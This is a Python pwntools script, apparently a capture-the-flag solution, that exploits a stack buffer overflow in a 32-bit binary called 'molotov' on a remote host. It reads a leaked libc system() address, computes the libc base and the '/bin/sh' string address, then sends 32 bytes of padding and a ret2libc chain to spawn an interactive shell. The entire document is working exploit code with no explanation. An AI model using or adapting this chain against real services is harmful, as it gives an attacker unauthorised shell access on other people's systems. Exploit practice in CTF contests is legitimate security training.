
from pwn import *

# r = process('./molotov')
r = remote('54.210.217.206', 1240)
# elf = ELF('/lib/i386-linux-gnu/libc.so.6') # local
# https://libc.blukat.me/?q=system%3A0xf7d3e8b0&l=libc6_2.30-0ubuntu2.1_i386
elf = ELF('./libc6_2.30-0ubuntu2.1_i386.so')  # remote

elf_system = elf.symbols['system']
system = int(r.recvline().strip(), 16)

LIBC_BASE = system - elf_system
ADDR_BINSH = next(elf.search(b'/bin/sh')) + LIBC_BASE

r.recvline()

p = b'A' * 32
p += p32(system)
p += p32(0x0)
p += p32(ADDR_BINSH)

r.sendline(p)
r.interactive()
